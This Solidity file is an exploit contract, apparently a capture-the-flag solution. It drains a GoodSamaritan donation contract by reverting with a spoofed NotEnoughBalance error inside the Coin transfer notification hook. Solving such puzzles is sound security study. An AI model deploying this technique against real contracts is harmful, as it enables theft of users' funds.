// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./INotifyable.sol";
import "./GoodSamaritan.sol";
import "./Coin.sol";
import "./Wallet.sol";

/**
 * The attack contract. 
 */
contract ErrorAttack is INotifyable {
    address markAddr; 
    uint count;
    
    error NotEnoughBalance();
    
    /**
     * @dev This will be called automatically from Coin's transfer method. It will make 
     * a reentrant call back into GoodSamaritan, then throw an exception which will 
     * trigger GoodSamaritan to dump all its funds. 
     */
    function notify(uint256 /*amount*/) external override {
        if (count > 0) {
            //if it's not the first time, 
            revert NotEnoughBalance();
        }
        else {
            
            //the 'mark' 
            GoodSamaritan mark = GoodSamaritan(markAddr);
            Coin coin = Coin(msg.sender);
            Wallet wallet = mark.wallet();
            
            //if there is a positive balance, reenter the call stack
            if (coin.balances(address(wallet)) > 0) {
                count+= 1; 
                mark.requestDonation();
            }
        }
    }
    
    /**
     * @dev Publicly call this function from the front end to start off the attack. 
     * @param _mark Pass the address of the GoodSamaritan contract that is the target of attack.
     */
    function attack(address _mark) external {
        count = 0; 
        GoodSamaritan mark = GoodSamaritan(_mark);
        markAddr = _mark;
        
        //request a donation from the mark 
        mark.requestDonation();
    }
}
